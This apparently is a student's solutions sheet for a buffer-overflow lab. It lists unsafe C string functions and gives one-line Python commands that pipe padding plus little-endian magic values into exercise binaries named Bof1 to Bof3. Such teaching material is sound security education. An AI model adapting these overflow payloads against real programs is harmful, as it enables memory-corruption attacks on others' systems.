# Presentation + Variation 1
## Exercise 3a
```
strcat() --- Not safe, vulnerable to overflow attacks.
gets() -- Very dangerous, please never use.
strncat() --- Better version of strcat()
fgets() --- The safe version of gets()
sprintf() --- Does not check buffer boundaries. Overflows are possible.
puts() --- Looks like gets(), but not particularly dangerous. Automatically appends newline.
printf() --- Can be dangerous, be aware of format string vulnerabilities when used.
fputs() --- The newer version of puts(). No new line.
```

## Exercise 3b
`python -c 'print 30*"A"' |./Bof1`

# Endianness, Variation 2
## Exercise 3c
`python -c 'print 10*"A" + "\xbe\xba\xfe\xca"' |./Bof2`

## Exercise 3d
`python -c 'print 24*"A" +  "\xef\xbe\xad\xde"' | ./Bof3`

# Instruction pointer, Pro
## Exercise 3e
https://0xrick.github.io/binary-exploitation/bof4/

